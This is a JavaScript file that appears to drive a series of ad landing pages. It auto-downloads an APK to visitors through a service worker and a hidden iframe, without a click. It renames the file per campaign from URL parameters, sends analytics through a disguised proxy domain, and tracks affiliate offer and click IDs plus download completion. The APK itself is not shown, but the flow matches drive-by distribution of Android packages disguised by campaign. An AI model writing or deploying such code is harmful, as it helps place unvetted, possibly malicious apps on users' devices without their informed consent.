// Shared landing logic for 021-030.
// Loaded BEFORE the script that calls posthog.init.
//
// Public API: window.DownLand
// Globals kept for landing scripts: log, capture, timedStep, timedSync, stepStart, stepEnd
(function () {
    'use strict';

    const TOKEN = 'phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL';
    const API_HOST = 'https://uiuirestorehere.art';
    const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
    const DEFAULT_FILE_NAME = 'download9918.apk';
    const CACHE_BUSTER = 'personal-site';

    const start = performance.now();

    let land = 'unknown';
    let swUrl;
    let savedParams = new URLSearchParams();
    let currentOfferId = null;

    let phog = null;
    let posthogInitStart = 0;
    const logQueue = [];
    const eventQueue = [];

    const logContext = {
        offer_id: 'undefined',
        click_id: 'undefined',
        file_name: 'undefined',
    };

    const platformInfo = {
        platform: 'undefined',
        platform_version: 'undefined',
    };

    let downloadTracked = false;
    let downloadCanceled = false;
    let downloadFailed = false;
    let downloadId = 'undefined';
    let downloadCompleted = false;

    function makeDownloadId() {
        try {
            if (typeof crypto !== 'undefined' && crypto.randomUUID) return crypto.randomUUID();
        } catch (error) {
            // ignore, fall back below
        }
        return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
    }

    // Full error details for logs: name/message/stack plus optional cause.
    function errorAttributes(error, extra = {}) {
        const out = { ...extra };
        if (error && typeof error === 'object') {
            out.error_name = error.name || 'undefined';
            out.error_message = error.message || 'undefined';
            out.error_stack = error.stack ? String(error.stack).slice(0, 2000) : 'undefined';
            if (error.cause !== undefined) {
                out.error_cause = (error.cause && error.cause.message)
                    ? `${error.cause.name || 'Error'}: ${error.cause.message}`
                    : String(error.cause);
            }
        } else if (error !== undefined) {
            out.error_name = 'undefined';
            out.error_message = String(error);
            out.error_stack = 'undefined';
        }
        return out;
    }

    // --- utils -----------------------------------------------------------------

    function pickClickId(params) {
        return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || '';
    }

    function getTimestampWithMs() {
        const d = new Date();
        const pad = (n, len = 2) => String(n).padStart(len, '0');

        const yyyy = d.getFullYear();
        const mm = pad(d.getMonth() + 1);
        const dd = pad(d.getDate());
        const hh = pad(d.getHours());
        const mi = pad(d.getMinutes());
        const ss = pad(d.getSeconds());
        const ms = pad(d.getMilliseconds(), 3);

        return `${yyyy}-${mm}-${dd}_${hh}-${mi}-${ss}.${ms}`;
    }

    // Sanitized display file name, always timestamped.
    function sanitizeFileName(value) {
        const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
        const candidate = String(value || '')
              .replace(/\.apk$/i, '')
              .slice(0, 80);
        const isValid = candidate !== ''
              && !/^[ _-]+$/.test(candidate)
              && !/^ /.test(candidate)
              && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
        const base = isValid ? candidate : fallbackBase;
        return `${base}.${getTimestampWithMs()}.apk`;
    }

    // --- context ---------------------------------------------------------------

    function contextAttributes() {
        return {
            offer_id: logContext.offer_id,
            click_id: logContext.click_id,
            file_name: logContext.file_name,
            download_id: downloadId,
        };
    }

    function contextSuffix() {
        const parts = [];
        if (logContext.offer_id !== 'undefined') parts.push(`offer_id: [${logContext.offer_id}]`);
        if (logContext.click_id !== 'undefined') parts.push(`click_id: [${logContext.click_id}]`);
        if (logContext.file_name !== 'undefined') parts.push(`file_name: [${logContext.file_name}]`);
        return parts.length ? ' ' + parts.join(', ') : '';
    }

    function syncContext(params) {
        try {
            const p = params || window.__savedDownloadParams || new URLSearchParams(window.location.search);
            savedParams = p;
            logContext.offer_id = p.get('offer_id') || 'undefined';
            logContext.click_id = pickClickId(p) || 'undefined';
            logContext.file_name = p.get('utm_medium') || 'undefined';
            currentOfferId = logContext.offer_id !== 'undefined' ? logContext.offer_id : null;
        } catch (error) {
            log('error', 'Failed to read landing params', errorAttributes(error));
        }
        if (phog) {
            phog.register(contextAttributes());
        }
        return logContext;
    }

    function offerId() {
        return currentOfferId;
    }

    function fileName(utmMedium) {
        return sanitizeFileName(utmMedium);
    }

    function redirectUrl() {
        const target = new URL(REDIRECT_HREF);
        target.searchParams.set('clickid', savedParams.get('clickid') || '');
        return target.href;
    }

    // --- environment attributes ------------------------------------------------

    function envAttributes() {
        const attrs = {
            sw_url: swUrl,
            is_secure: typeof window !== 'undefined' ? window.isSecureContext : undefined,
        };
        try {
            attrs.is_native_register = navigator.serviceWorker.register.toString().includes('[native code]');
        } catch (error) {
            attrs.is_native_register = 'undefined';
        }
        try {
            attrs.is_iframe = window.top !== window.self;
        } catch (error) {
            attrs.is_iframe = 'undefined';
        }
        return attrs;
    }

    function connectionAttributes() {
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            return {
                effective_type: conn && conn.effectiveType ? conn.effectiveType : 'undefined',
                downlink_mbps: conn && typeof conn.downlink === 'number' ? conn.downlink : 'undefined',
                rtt_ms: conn && typeof conn.rtt === 'number' ? conn.rtt : 'undefined',
                save_data: conn && typeof conn.saveData === 'boolean' ? conn.saveData : 'undefined',
                online: typeof navigator.onLine === 'boolean' ? navigator.onLine : 'undefined',
            };
        } catch (error) {
            log('error', 'Connection info unavailable', errorAttributes(error));

            return {};
        }
    }

    function platformAttributes() {
        return {
            platform: platformInfo.platform,
            platform_version: platformInfo.platform_version,
        };
    }

    function detectPlatformSync() {
        try {
            const ua = navigator.userAgent || '';
            let platform = (navigator.userAgentData && navigator.userAgentData.platform) || '';
            let platformVersion = '';

            if (!platform) {
                if (/Android/i.test(ua)) platform = 'Android';
                else if (/iPhone|iPad|iPod/i.test(ua)) platform = 'iOS';
                else if (/Windows/i.test(ua)) platform = 'Windows';
                else if (/Mac OS X/i.test(ua)) platform = 'macOS';
                else if (/Linux/i.test(ua)) platform = 'Linux';
            }

            const match = ua.match(/Android\s+([\d.]+)/i)
                  || ua.match(/Windows NT\s+([\d.]+)/i)
                  || ua.match(/Mac OS X\s+([\d_]+)/i)
                  || ua.match(/CPU (?:iPhone )?OS\s+([\d_]+)/i);

            if (match) platformVersion = match[1].replace(/_/g, '.');

            platformInfo.platform = platform || 'undefined';
            platformInfo.platform_version = platformVersion || 'undefined';
        } catch (error) {
            log('error', 'Platform detection failed', errorAttributes(error));
        }

        return platformInfo;
    }

    async function refreshPlatformAsync() {
        try {
            if (!(navigator.userAgentData && navigator.userAgentData.getHighEntropyValues)) {
                return;
            }
            const hints = await navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion']);
            if (hints && hints.platform) platformInfo.platform = hints.platform;
            if (hints && hints.platformVersion) platformInfo.platform_version = hints.platformVersion;
            if (phog) {
                phog.register(platformAttributes());
            }
        } catch (error) {
            log('error', 'Client Hints unavailable', errorAttributes(error));
        }
    }

    // --- posthog bridge --------------------------------------------------------

    function log(level, message, attributes = {}) {
        const merged = { ...contextAttributes(), ...envAttributes(), ...attributes };
        merged['delay'] = performance.now() - start;
        merged['land'] = land;
        const body = `${message}${contextSuffix()}`;

        if (phog == null) {
            logQueue.push({ level, message: body, attributes: merged });
            return;
        }

        if (posthogInitStart == 0) {
            posthogInitStart = performance.now();
        }

        merged['delay_after_posthog_init'] = performance.now() - posthogInitStart;
        phog.logger[level](body, merged);
    }

    function capture(event, attributes = {}) {
        const merged = { ...contextAttributes(), ...attributes };
        merged['delay'] = performance.now() - start;
        merged['land'] = land;

        if (phog == null) {
            eventQueue.push({ event, attributes: merged });
            return;
        }

        if (posthogInitStart == 0) {
            posthogInitStart = performance.now();
        }

        merged['delay_after_posthog_init'] = performance.now() - posthogInitStart;
        phog.capture(event, merged);
    }

    let stepStartedAt = 0;
    function stepStart(label) {
        stepStartedAt = performance.now();
        log('info', `Await ${label}`);
    }

    function stepEnd(label, extra = {}, key = 'await_duration_ms') {
        log('info', `Awaited ${label}`, { [key]: Math.round(performance.now() - stepStartedAt), ...extra });
    }

    async function timedStep(label, promise) {
        stepStart(label);

        try {
            const value = await promise;
            stepEnd(label);
            return value;
        } catch (error) {
            log('error', `Step failed: ${label}`, errorAttributes(error));
            throw error;
        }
    }

    function timedSync(label, fn) {
        stepStart(label);

        try {
            const value = fn();
            stepEnd(label, {}, 'duration_ms');
            return value;
        } catch (error) {
            log('error', `Step failed: ${label}`, errorAttributes(error));
            throw error;
        }
    }

    // Returns the full argument list for posthog.init: [token, options].
    // The loaded callback is owned here; the landing only supplies the identity.
    function posthogParams(config = {}) {
        land = config.land || 'unknown';
        swUrl = config.swUrl;

        return [
            TOKEN,
            {
                api_host: API_HOST,
                advanced_disable_flags: true,
                disable_external_dependency_loading: false,
                disable_session_recording: true,
                disable_surveys: true,
                capture_exceptions: {
                    capture_unhandled_errors: true,
                    capture_unhandled_rejections: true,
                    capture_console_errors: false,
                },
                autocapture: true,
                capture_pageview: true,
                capture_pageleave: true,
                logs: {
                    serviceName: 'web',
                    environment: 'production',
                },
                person_profiles: 'identified_only',
                loaded: function (ph) {
                    syncContext();
                    ph.register({
                        land,
                        ...contextAttributes(),
                        ...platformAttributes(),
                        ...envAttributes(),
                        ...connectionAttributes(),
                    });

                    log('info', 'Posthog init');

                    phog = ph;
                    refreshPlatformAsync();

                    for (const entry of logQueue) {
                        ph.logger[entry.level](entry.message, entry.attributes);
                    }

                    for (const entry of eventQueue) {
                        ph.capture(entry.event, entry.attributes);
                    }
                },
            }
        ];
    }

    // --- download flow ---------------------------------------------------------

    function resetDownload() {
        downloadTracked = false;
        downloadCanceled = false;
        downloadFailed = false;
        downloadCompleted = false;
    }

    function markDownloadAttempt() {
        resetDownload();
        downloadId = makeDownloadId();
        return downloadId;
    }

    // Poor user network: these thresholds split "user's bad connection" from
    // a working connection that still hit a server-side failure.
    const POOR_NETWORKS = ['slow-2g', '2g', '3g'];
    function networkQuality() {
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const type = conn && conn.effectiveType ? conn.effectiveType : null;
            const rtt = conn && typeof conn.rtt === 'number' ? conn.rtt : null;
            const downlink = conn && typeof conn.downlink === 'number' ? conn.downlink : null;

            const poor = (type && POOR_NETWORKS.includes(type))
                || (rtt !== null && rtt >= 300)
                || (downlink !== null && downlink <= 1.5);

            return poor ? 'poor' : 'ok';
        } catch (error) {
            return 'undefined';
        }
    }

    // Classify a failed download: where it broke and who is at fault.
    //   upstream_5xx / upstream_4xx - response came from the worker with an error status
    //   network                     - fetch/stream broke without a status (connection dropped)
    //   tracking_miss               - response did not come from our worker
    //   unknown                     - none of the above
    function failureReason(info = {}) {
        // The worker tells us the real reason via X-DL-Fail; prefer it over the
        // synthetic 502 status it uses for its own failures.
        const workerFail = info.worker_fail;
        if (workerFail && workerFail !== 'undefined') return workerFail;

        const served = info.served_header;
        const attemptId = info.attempt_id;
        const fromWorker = served !== undefined && served !== 'undefined' && served === attemptId;
        const status = typeof info.status_code === 'number' ? info.status_code : Number(info.status_code);
        const hasStatus = Number.isFinite(status) && status > 0;

        if (fromWorker && hasStatus && status >= 500) return 'upstream_5xx';
        if (fromWorker && hasStatus && status >= 400) return 'upstream_4xx';
        if (!fromWorker && hasStatus) return 'tracking_miss';
        if (!hasStatus) return 'network';
        return 'unknown';
    }

    function failureReasonAttributes(info) {
        const reason = failureReason(info);
        const out = { reason };
        if (reason === 'network') {
            out.network_quality = networkQuality();
        }
        return out;
    }

    function downloadDiag(attempt, targetHref) {
        const response = attempt && attempt.response;
        return {
            status_code: response ? response.status : 'undefined',
            status_text: response ? (response.statusText || 'undefined') : 'undefined',
            response_url: response ? (response.url || 'undefined') : 'undefined',
            response_type: response ? (response.type || 'undefined') : 'undefined',
            response_redirected: response ? String(response.redirected) : 'undefined',
            served_header: (attempt && attempt.served) || 'undefined',
            worker_fail: (attempt && attempt.fail) || 'undefined',
            upstream_status_code: (attempt && attempt.failStatus) || 'undefined',
            request_url: targetHref,
            sw_controlled: !!navigator.serviceWorker.controller,
            sw_controller_url: (navigator.serviceWorker.controller && navigator.serviceWorker.controller.scriptURL) || 'undefined',
        };
    }

    async function fetchTracked(targetHref, label) {
        const response = await timedStep(label, fetch(targetHref, {
            method: 'GET',
            mode: 'cors',
            credentials: 'omit',
            redirect: 'follow',
            cache: 'no-store',
            headers: { 'X-DL-Track': '1' },
        }));
        let served = 'undefined';
        let fail = 'undefined';
        let failStatus = 'undefined';
        try {
            served = response.headers.get('X-DL-Served') || 'undefined';
            fail = response.headers.get('X-DL-Fail') || 'undefined';
            failStatus = response.headers.get('X-DL-Fail-Status') || 'undefined';
        } catch (error) {
            served = 'unreadable';
        }
        return { response, served, fail, failStatus };
    }

    async function trackDownload(targetHref, attemptId) {
        if (downloadTracked) {
            log('info', 'Download tracking skipped (already tracked)');
            return;
        }

        downloadTracked = true;
        const startedAt = performance.now();
        let bytesRead = 0;
        let contentLength = null;

        const isCurrentAttempt = () => attemptId === undefined || attemptId === downloadId;

        let attempt = null;

        try {
            attempt = await fetchTracked(targetHref, 'download completion');

            if (!isCurrentAttempt()) {
                log('info', 'Download tracking skipped (stale attempt)', { attempt_download_id: attemptId });
                return;
            }

            // If the worker did not serve the response, the request bypassed it
            // (race on first load). Retry once after the worker takes control.
            if (attempt.served !== attemptId) {
                log('warn', 'Download not served by service worker, retrying', downloadDiag(attempt, targetHref));
                await new Promise((resolve) => window.setTimeout(resolve, 400));

                if (!isCurrentAttempt()) {
                    log('info', 'Download tracking skipped (stale attempt)', { attempt_download_id: attemptId });
                    return;
                }

                attempt = await fetchTracked(targetHref, 'download completion retry');

                if (!isCurrentAttempt()) {
                    log('info', 'Download tracking skipped (stale attempt)', { attempt_download_id: attemptId });
                    return;
                }
            }

            // Still not served by the worker: treat as tracking miss, not a failure.
            if (attempt.served !== attemptId) {
                const details = downloadDiag(attempt, targetHref);
                log('warn', 'Download tracking miss (response not from service worker)', details);
                capture('DownloadTrackingMiss', { ...details, duration_ms: Math.round(performance.now() - startedAt), download_id: attemptId });
                return;
            }

            const response = attempt.response;

            const rawLength = Number(response.headers.get('Content-Length'));
            contentLength = (response.headers.get('Content-Length') !== null && Number.isSafeInteger(rawLength) && rawLength > 0)
                ? rawLength
                : null;

            if (!response.ok) {
                downloadFailed = true;
                const details = downloadDiag(attempt, targetHref);
                const reasonAttrs = failureReasonAttributes({ ...details, attempt_id: attemptId });
                log('error', 'Download completion fetch failed', { ...details, ...reasonAttrs });
                if (!downloadCanceled) {
                    capture('DownloadFailed', { ...details, ...reasonAttrs, duration_ms: Math.round(performance.now() - startedAt), download_id: attemptId });
                }
                return;
            }

            const reader = response.body.getReader();
            let bytes = 0;
            while (true) {
                const { done, value } = await reader.read();
                if (done) {
                    break;
                }
                bytes += value.byteLength;
                bytesRead = bytes;
            }

            if (!isCurrentAttempt()) {
                log('info', 'Download completion skipped (stale attempt)', { attempt_download_id: attemptId });
                return;
            }

            if (downloadFailed || downloadCanceled) {
                log('info', 'Download completion skipped (already failed/canceled)');
                return;
            }

            downloadCompleted = true;
            capture('Downloaded', { bytes, duration_ms: Math.round(performance.now() - startedAt), download_id: attemptId });
        } catch (error) {
            downloadFailed = true;

            const diag = {
                request_url: targetHref,
                bytes_read: bytesRead,
                content_length: contentLength === null ? 'undefined' : contentLength,
                percent: (typeof contentLength === 'number' && contentLength > 0)
                    ? Math.round((bytesRead / contentLength) * 100)
                    : 'undefined',
                served_header: (attempt && attempt.served) || 'undefined',
                sw_controlled: !!navigator.serviceWorker.controller,
                sw_controller_url: (navigator.serviceWorker.controller && navigator.serviceWorker.controller.scriptURL) || 'undefined',
            };
            const reasonAttrs = failureReasonAttributes({ ...diag, attempt_id: attemptId });
            log('error', 'Download tracking failed', errorAttributes(error, { ...diag, ...reasonAttrs }));

            // Give a pending DOWNLOAD_CANCELED message a moment to arrive so we do
            // not emit DownloadFailed for what the user actually canceled.
            window.setTimeout(() => {
                if (downloadCanceled || downloadCompleted || !isCurrentAttempt()) {
                    log('info', 'DownloadFailed skipped (canceled/completed/newer attempt)');
                    return;
                }
                capture('DownloadFailed', errorAttributes(error, {
                    ...diag,
                    ...reasonAttrs,
                    duration_ms: Math.round(performance.now() - startedAt),
                    download_id: attemptId,
                }));
            }, 250);
        }
    }

    function startDownload(options = {}) {
        try {
            if (!currentOfferId) {
                log('warn', 'Offer ID is missing');
                return;
            }

            const attemptId = options.keepAttempt ? downloadId : markDownloadAttempt();

            const target = new URL('download.apk', window.__landingRoot);
            if (options.passParams) {
                for (const [key, value] of savedParams) {
                    target.searchParams.set(key, value);
                }
            }
            target.searchParams.set('download_id', attemptId);
            log('info', 'Starting service worker download', { target: target.href });

            const frame = document.querySelector('#downloadFrame');
            frame.src = 'about:blank';
            window.setTimeout(() => {frame.src = target.href;}, 0);

            trackDownload(target.href, attemptId).catch((error) => {
                log('error', 'Download tracking setup failed', errorAttributes(error));
            });
        } catch (error) {
            log('error', 'Start download failed', errorAttributes(error));
        }
    }

    function autoDownload(options = {}) {
        try {
            markDownloadAttempt();
            capture('Auto download');
            startDownload({ ...options, keepAttempt: true });
        } catch (error) {
            log('error', 'Auto download failed', errorAttributes(error));
        }
    }

    function onCanceled(data) {
        try {
            if (data && data.download_id && data.download_id !== downloadId) {
                log('info', 'DownloadCanceled ignored (stale download_id)', { event_download_id: data.download_id });
                return;
            }
            if (downloadCompleted) {
                log('info', 'DownloadCanceled ignored (already completed)');
                return;
            }

            downloadCanceled = true;

            capture('DownloadCanceled', {
                bytes: data && data.bytes,
                content_length: data && data.content_length,
                reason: data && data.reason,
            });
        } catch (error) {
            log('error', 'Download canceled handler failed', errorAttributes(error));
        }
    }

    function onTrustedClick(event) {
        try {
            if (event && event.isTrusted) {
                capture('Click button');
            }
        } catch (error) {
            log('error', 'Click button capture failed', errorAttributes(error));
        }
    }

    // --- posthog stub (must exist before posthog.init is called) ---------------

    !function (t, e) { var o, n, p, r; e.__SV || (window.posthog && window.posthog.__loaded) || (window.posthog = e, e._i = [], e.init = function (i, s, a) { function g(t, e) { var o = e.split("."); 2 == o.length && (t = t[o[0]], e = o[1]), t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } } p || ((p = t.createElement("script")).type = "text/javascript", p.crossOrigin = "anonymous", p.async = !0, p.src = s.api_host.replace(".i.posthog.com", "-assets.i.posthog.com") + "/static/array.js", p.onerror = function () { p = null }, (r = t.getElementsByTagName("script")[0]).parentNode.insertBefore(p, r)); var u = e; for (void 0 !== a ? u = e[a] = [] : a = "posthog", u.people = u.people || [], Object.defineProperty(u, "toString", { configurable: !0, enumerable: !0, writable: !0, value: function (t) { var e = "posthog"; return "posthog" !== a && (e += "." + a), t || (e += " (stub)"), e } }), Object.defineProperty(u.people, "toString", { configurable: !0, enumerable: !0, writable: !0, value: function () { return u.toString(1) + ".people (stub)" } }), o = "Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "), n = 0; n < o.length; n++)g(u, o[n]); e._i.push([i, s, a]) }, e.__SV = 1) }(document, window.posthog || []);

    detectPlatformSync();

    // --- exports ---------------------------------------------------------------

    const DownLand = {
        posthogParams,
        log,
        capture,
        timedStep,
        timedSync,
        stepStart,
        stepEnd,
        syncContext,
        offerId,
        fileName,
        redirectUrl,
        startDownload,
        autoDownload,
        trackDownload,
        resetDownload,
        onCanceled,
        onTrustedClick,
        contextAttributes,
        envAttributes,
        platformAttributes,
        connectionAttributes,
        cacheBuster: CACHE_BUSTER,
    };

    window.DownLand = DownLand;
    window.log = log;
    window.capture = capture;
    window.timedStep = timedStep;
    window.timedSync = timedSync;
    window.stepStart = stepStart;
    window.stepEnd = stepEnd;
})();
